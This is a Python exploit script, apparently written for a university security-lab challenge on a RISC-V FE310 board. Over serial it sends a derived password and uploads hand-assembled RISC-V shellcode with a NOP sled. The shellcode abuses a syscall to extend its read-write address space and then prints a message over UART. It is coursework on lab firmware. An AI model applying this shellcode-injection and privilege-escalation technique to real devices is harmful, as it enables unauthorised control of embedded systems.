#!/usr/bin/env python3
try:
    import serial
    import re
    import os
    import pylink
except ModuleNotFoundError:
    print("Python is missing the a library, probably pylink")
    quit()
    
riscv_console = '/dev/ttyACM0'
esp32_console = '/dev/ttyACM1'
BAUDRATE = 115200
utf8 = 'utf-8'

lengthi = 2049#bufferlength in int
marker_offset = 1792#x700 in int
lengthb = b"\x00\x00\x08\x00"
nop = b"\x13\x00\x00\x00"#no operation: addi    x0,x0,0
execbyte = b"\x01"#something != \x00
    
def reset_board():
    shell_command = "echo -en '\\rnh\\nrnh\\nexit\\n' | JLinkExe -device fe310 -If JTAG -speed 4000 -Autoconnect 1 > /dev/null"
    ret = os.system(shell_command)
    print(color.RED + 'Reset board: '+(lambda x: 'success' if (x==0) else 'failed')(ret) + color.END)
    return
    
def reset_board_pylink():
    jlink = pylink.JLink()
    jlink.open()
    jlink.connect('FE310')
    jlink.reset(halt=False)
    jlink.close()

def obtain_mac(esp32):
    while True:
        try:
            line = esp32.readline().decode(utf8)
            mac_matcher = re.compile('wifi: mode : sta \(([^)]+)\)')
            match = re.search(mac_matcher,line)
            if match:
                return match.group(1)
        except Exception as e: 
            print(e)
            break

def send_secret(riscv, secret):
    riscv.flushInput()
    riscv.write(bytes('\n', utf8))#reset buffer
    riscv.write(bytes(secret, utf8))
    
def wait_for_ack(ser, msg):
    while True:
        line = ser.readline().decode(utf8)
        if msg in line:
            print ("Received: "+msg)
            return

def to_picocom():
    os.system("picocom -b 115200 -l --quiet /dev/ttyACM0")
    
def get_syscall_code():
    bytecode = bytearray(b"\x33\x45\xa5\x00") #xor     a0,a0,a0
    bytecode.extend(b"\x13\x65\x55\x00")#a0=5 syscall
    bytecode.extend(b"\xb3\x05\xc0\x00")#c.mv a1,a2             [a2 is 0800 1800]
    bytecode.extend(b"\x93\x85\x05\xf0")#addi a1,(a1-100)       [set pointer to value 0x0 at 08001700]
    bytecode.extend(b"\x73\x00\x00\x00")#ecall
    bytecode.extend(b"\x13\x05\x15\x00")#addi a0,1
    #bytecode.extend(b"\xb7\x25\x00\x80")#lui a1,0x80002         [set write target addr]
    bytecode.extend(b"\xb7\x35\x00\x80")
    bytecode.extend(b"\x93\x85\x05\x70")
    bytecode.extend(b"\x93\x85\x85\x20")
    bytecode.extend(b"\x73\x00\x00\x00")#ecall
    return bytecode
    
def get_exit_code():
    bytecode = bytearray(b"\x33\x45\xa5\x00") #xor     a0,a0,a0
    bytecode.extend(b"\x13\x65\x15\x00") #ori a0,a0,0x1
    bytecode.extend(b"\x73\x00\x00\x00")#ecall
    return bytecode
    
def first_game(length):
    code = get_syscall_code()
    #add nops until marker, but leave space for 3 instr. (exit syscall)
    for x in range(len(code),marker_offset-3*len(nop),len(nop)):
        code.extend(nop)
    code.extend(get_exit_code())
    code.extend(b"\x00\x00\x00\x00")#this is where we point our syscall 5 towards
    for x in range(len(code),length-1,len(nop)):
        code.extend(nop)
    #execbyte is needed to make the firmware execute the code
    code.extend(execbyte)
    return code

def second_game(length):
    #Send "Hi from FE310!!\r\n" via Uart to demonstrate that we have gained RW access
    code = bytearray(b"\x37\x37\x01\x10")#lui a4 uart [0x10013000]
    char = {
    0: b"\x86\x04",
    1: b"\x96\x06",
    2: b"\x06\x02",
    3: b"\x66\x06",
    4: b"\x26\x07",
    5: b"\xf6\x06",
    6: b"\xd6\x06",
    7: b"\x06\x02",
    8: b"\x66\x04",
    9: b"\x56\x04",
    10: b"\x36\x03",
    11: b"\x16\x03",
    12: b"\x06\x03",
    13: b"\x16\x02",
    14: b"\x16\x02",
    15: b"\xD6\x00",
    16: b"\xA6\x00"
    }
    for i in range(17):
        code.extend(b"\x33\x46\xc6\x00")#xor a2,a2
        code.extend(b"\x13\x06"+char.get(i))#load char into a2
        code.extend(b"\x1c\x43")#lw uart_tx into a5
        code.extend(b"\xe3\xcf\x07\xfe")#decrease pc by 2 if a5 less than 0 [essentially wait for uart rdy]
        code.extend(b"\x10\xc3")#c.sw a2, 0x0(a4) [write char to uart 0]
    code.extend(get_exit_code())
    for x in range(len(code),length):
        code.extend(b"A")
    return code
    
def send_game(message, code):
    print(color.BLUE + "\t\tSent: l to load game"+ color.END)
    riscv.write(bytes('l', utf8))
    wait_for_ack(riscv, 'So, you brought your own, he?')
    print(color.BLUE + message + color.END)
    riscv.flushInput()
    riscv.write(lengthb)
    riscv.write(code)
    return
    
#class is for formatting output to increase readability
class color:
    BLUE = '\033[94m'
    RED = '\033[91m'
    END = '\033[0m'

if __name__ == '__main__':
    riscv = serial.Serial(riscv_console, BAUDRATE, timeout=1)
    esp32 = serial.Serial(esp32_console, BAUDRATE, timeout=1)
    reset_board_pylink()
    mac = obtain_mac(esp32)
    esp32.close()
    print(color.RED + "MAC found: " +mac+ color.END)
    wait_for_ack(riscv, 'Welcome.')
    print(color.BLUE + "\t\tSent: Secret Password" + color.END)
    send_secret(riscv, "__SecLab__"+mac +"\r\n")
    wait_for_ack(riscv, 'Greetings Professor Falken. Shall we play a game?')
    input("Press Enter")
    send_game("\t\tSent: Game Code to extend RW-Addressspace", first_game(lengthi))
    print(color.RED + "Exit game" + color.END)
    wait_for_ack(riscv, 'What do you want to play?')
    # sent second game (for fun I wrote some asm code that sends a string back via uart)
    send_game("\t\tSent: Game code with elevated RW rights", second_game(lengthi))
    riscv.close()
    print(color.RED + "Task done, switching to picocom console, exit with CRTL+A+X" + color.END)
    to_picocom()
